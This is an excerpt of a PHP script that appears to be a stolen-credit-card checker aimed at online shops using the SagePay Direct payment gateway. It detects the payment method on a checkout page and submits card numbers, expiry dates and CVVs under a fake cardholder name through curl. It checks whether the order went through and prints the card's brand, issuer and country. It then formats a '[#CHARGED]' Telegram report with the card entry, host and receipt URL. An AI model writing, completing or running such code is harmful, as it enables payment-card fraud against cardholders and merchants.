...
$paymentMethods = [
    ...
    'sagepaydirect' => '/<input[^>]*name="payment_method"[^>]*value="sagepaydirect"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'sagepaydirect-card-type' => $brand,
    'sagepaydirect-card-name' => 'Sen Kai',
    'sagepaydirect-card-number' => $cc,
    'sagepaydirect-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'sagepaydirect-card-cvc' =>  $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED SAGEDIRECT]
    \n[$hostname1]
    \n[$receiptUrl]\n";
